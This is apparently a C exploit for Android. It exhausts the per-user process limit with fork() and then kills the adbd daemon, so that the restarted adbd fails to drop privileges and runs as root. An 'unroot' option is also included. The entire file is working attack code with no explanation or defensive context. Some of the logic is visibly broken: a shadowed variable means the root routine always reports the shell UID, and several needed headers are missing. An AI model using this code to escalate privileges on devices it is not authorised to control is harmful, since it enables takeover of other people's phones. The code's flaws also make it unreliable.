#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define USAGE(NAME) fprintf(stderr, "Usage: %s [%s|%s]\n", NAME, ARG_ROOT, ARG_UNROOT)

static const char* PROC = "/proc"; // process pseudo-filesystem root
static const char* ADBD_CMDLINE = "/sbin/adbd"; // cmdline used to start adbd
static const char* ARG_ROOT = "root";
static const char* ARG_UNROOT = "unroot";
static const int ROOT_UID = 0;
static const int SHELL_UID = 2000;
static const int MAX_ROOT_TRIES = 10; // give up if we can't root after this many times

static pid_t get_pid(const char*); // get the pid of a process started with the arg
static uid_t get_uid(pid_t); // get the uid of a process with the pid
static uid_t root(); // attempt to root and return the uid we ended up with

int main(int argc, char* argv[]) {
	if (argc != 2) {
		USAGE(argv[0]);
		return EXIT_FAILURE;
	}
	pid_t adbd_pid = get_pid(ADBD_CMDLINE);
	uid_t adbd_uid = get_uid(adbd_pid);
	if (strcmp(argv[1], ARG_ROOT) == 0) {
		if (adbd_uid == ROOT_UID) {
			fprintf(stderr, "Already rooted...\n");
			return EXIT_FAILURE;
		}
		return root() == ROOT_UID ? EXIT_SUCCESS : EXIT_FAILURE;

	} else if (strcmp(argv[1], ARG_UNROOT) == 0) {
		if (adbd_uid != ROOT_UID) {
			fprintf(stderr, "Already unrooted...\n");
			return EXIT_FAILURE;
		}
		kill(adbd_pid, SIGKILL);
		return EXIT_SUCCESS;
	} else {
		USAGE(argv[0]);
		return EXIT_FAILURE;
	}
}

pid_t get_pid(const char* cmdline) {
	DIR* dir;
	pid_t pid = -1;
	dir = opendir(PROC); // open the process pseudo-filesystem
	if (dir == NULL) {
		perror("Couldn't open /proc");
		return -1;
	}
	struct dirent* ent;
	int cmdline_len = strlen(cmdline);
	while ((ent = readdir(dir)) != NULL) { // enumerate all processes
		char buf[PATH_MAX];
		snprintf(buf, PATH_MAX, "%s/%s/cmdline", PROC, ent->d_name);
		int cmdline_fd = open(buf, O_RDONLY); // open the command used to start the process
		if (cmdline_fd < 0) {
			continue;
		}
		ssize_t bytes_read = read(cmdline_fd, buf, cmdline_len);
		if (bytes_read != cmdline_len) {
			close(cmdline_fd);
			continue;
		}
		buf[cmdline_len] = '\0';
		if (strcmp(buf, cmdline) == 0) { // if it is the process we were looking for get its pid
			pid = (pid_t) atoi(ent->d_name);
			close(cmdline_fd);
			break;
		}
		close(cmdline_fd);
	}
	closedir(dir);
	return pid;
}

uid_t get_uid(pid_t pid) {
	uid_t uid = -1;
	char buf[PATH_MAX];
	snprintf(buf, PATH_MAX,"%s/%d", PROC, pid);
	struct stat stat_buf; // get the uid by stating the /proc entry
	if (stat(buf, &stat_buf) == 0) {
		uid = stat_buf.st_uid;
	} else {
		perror("Couldn't stat");
	}
	return uid;
}

uid_t root() {
	struct rlimit rlimit_buf;
	getrlimit(RLIMIT_NPROC, &rlimit_buf); // fetch the process limit to let the user know how many children we need
	printf("Spawning children... (RLIMIT_NPROC: %d)\n", rlimit_buf.rlim_cur);
	int tries_left = MAX_ROOT_TRIES;
	uid_t adbd_uid = SHELL_UID;
	setsid(); // start a new session so when adbd goes down we don't go with it
	while (1) {
		pid_t child = fork();
		if (child == 0) {
			return EXIT_SUCCESS;
		} else if (child < 0) { // fork failed - attempt to restart adbd
			printf("RLIMIT_NPROC reached\n");
			pid_t adbd_pid = get_pid(ADBD_CMDLINE);
			if (adbd_pid >= 0) {
				uid_t adbd_uid = get_uid(adbd_pid);
				if (adbd_uid != ROOT_UID) {
					printf("adbd not root. Killing...\n");
					kill(adbd_pid, SIGKILL);
					tries_left--;
					if (tries_left == 0) {
						break;
					}
				} else {
					printf("adbd root. Stopping....\n");
					break;
				}
			}
		}
	}
	return adbd_uid;
}

